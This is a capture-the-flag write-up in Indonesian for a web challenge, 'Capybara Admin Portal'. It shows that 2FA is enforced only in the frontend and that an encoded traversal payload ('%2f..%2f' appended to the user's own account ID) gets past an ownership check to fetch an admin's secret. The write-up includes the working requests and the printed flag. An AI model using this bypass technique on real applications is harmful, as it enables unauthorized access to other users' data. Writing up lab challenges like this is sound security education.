# Capybara Admin Portal Writeup

Challenge ini kelihatannya sederhana di permukaan: kita dikasih satu akun biasa dan sebuah ID admin yang menyimpan secret. Setelah login sebagai user biasa, aplikasi memaksa masuk ke halaman 2FA. Tapi 2FA ini ternyata cuma hiasan frontend, karena backend tetap menerima token JWT dari hasil login pertama.

## Informasi awal

- Username: `angel`
- Password: `princess`
- ID akun biasa: `679202372644`
- ID admin target: `239716013`

## Enumerasi

Halaman login melakukan request ke endpoint berikut:

```http
POST /login
Content-Type: application/json

{"username":"angel","password":"princess"}
```

Response login memberi JWT dan mengarahkan user ke `/2fa`.

Di halaman `/2fa`, ada petunjuk penting di JavaScript:

- console log membocorkan endpoint internal `POST /admin/account/<id>`
- ada fungsi `getAccountData(id)` yang mengirim body `{"action":"fetch_secure_data"}`

Artinya, walaupun 2FA belum selesai, browser tetap bisa mengakses endpoint admin account selama punya token JWT dari login biasa.

## Uji akses biasa

Request normal ke account milik sendiri:

```http
POST /admin/account/679202372644
Authorization: Bearer <jwt_user_biasa>
Content-Type: application/json

{"action":"fetch_secure_data"}
```

Response memberitahu kalau user `angel` tidak berhak melihat flag, dan flag ada di akun `239716013`.

Kalau langsung ganti path menjadi:

```http
POST /admin/account/239716013
```

backend membalas `403 Forbidden`. Jadi ada pengecekan bahwa user biasa tidak boleh membuka account lain.

## Mencari bypass

Karena route yang dipakai berbasis path, saya fokus ke manipulasi path. Saya coba beberapa variasi encoding dan traversal pada segmen ID.

Payload yang berhasil:

```text
/admin/account/679202372644%2f..%2f239716013
```

Atau bentuk lain yang juga lolos:

```text
/admin/account/679202372644%2e%2e%2f239716013
```

Ini menunjukkan ada mismatch antara proses validasi dan proses resolusi path:

- kemungkinan validasi hanya mengecek bahwa path diawali dengan user ID milik kita
- tapi resolver route/backend kemudian menormalkan `%2f..%2f` menjadi traversal ke resource lain

Hasilnya, request terlihat aman saat dicek, tetapi akhirnya dibaca sebagai akun admin target.

## Exploit final

Request final:

```http
POST /admin/account/679202372644%2f..%2f239716013
Authorization: Bearer <jwt_user_biasa>
Content-Type: application/json

{"action":"fetch_secure_data"}
```

Response:

```json
{
  "data": "KubSTU{c4pyb4r4_p4th_tr4v3rs4l_m4st3r}",
  "owner": "Главная Капибара",
  "status": "success"
}
```

## Flag

```text
KubSTU{c4pyb4r4_p4th_tr4v3rs4l_m4st3r}
```

## Solver

Solver ada di file [solve.py](/home/nata/ctf/kubsuctf/web/capybaraadminportal/solve.py). Jalankan dengan:

```bash
source /home/nata/ctf_env/bin/activate
python solve.py
```

Solver akan:

1. login memakai credential valid
2. mengambil JWT
3. mengirim request traversal ke endpoint account admin
4. mencetak flag
